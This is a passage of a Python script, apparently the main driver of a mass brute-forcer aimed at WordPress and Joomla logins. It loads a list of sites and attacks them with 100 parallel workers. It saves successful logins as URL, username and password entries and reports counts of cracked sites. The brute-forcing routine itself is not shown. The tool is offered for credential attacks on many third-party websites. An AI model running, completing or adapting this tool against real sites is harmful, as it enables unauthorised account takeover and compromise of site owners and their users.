        bruteforcer = CMSBruteforce()
        global_stats['total'] = len(sites)
        global_stats['start_time'] = time.time()
        
        print(f'\n{Colors.CYAN}[+] Loaded {len(sites)} sites')
        print(f'[+] Results will be saved in: {bruteforcer.results_file}')
        print(f'[+] Starting with 100 threads{Colors.END}\n')
        
        # Create results file with header
        if not os.path.exists(bruteforcer.results_file):
            with open(bruteforcer.results_file, 'w') as f:
                f.write(f"# CMS Scanner Combined Results - {datetime.now()}\n")
                f.write("# Format: [CMS-TYPE] URL#USERNAME####PASSWORD\n")
                f.write("#" + "="*50 + "\n")
        
        # Start processing
        start_time = time.time()
        
        # Use thread pool
        with Pool(100) as pool:
            pool.map(bruteforcer.process_site, sites)
        
        # Print statistics
        elapsed = time.time() - start_time
        
        print(f'\n{Colors.CYAN}{"="*60}')
        print(f'[+] Scan completed in {elapsed:.2f} seconds')
        print(f'[+] Total sites: {global_stats["total"]}')
        print(f'[+] WordPress found: {global_stats["wordpress_found"]}')
        print(f'[+] Joomla found: {global_stats["joomla_found"]}')
        print(f'[+] WordPress success: {global_stats["wp_success"]}')
        print(f'[+] Joomla success: {global_stats["joomla_success"]}')
        print(f'[+] Failed: {global_stats["failed"]}')
        
        total_cms = global_stats['wordpress_found'] + global_stats['joomla_found']
        total_success = global_stats['wp_success'] + global_stats['joomla_success']
        
        if total_cms > 0:
            success_rate = (total_success / total_cms) * 100
            print(f'[+] Overall success rate: {success_rate:.1f}%')
        
        print(f'{"="*60}{Colors.END}')
        
    except KeyboardInterrupt:
        print(f'\n{Colors.RED}[!] Stopped by user{Colors.END}')
    except Exception as e:
        print(f'{Colors.RED}[!] Error: {str(e)}{Colors.END}')

if __name__ == "__main__":
    main()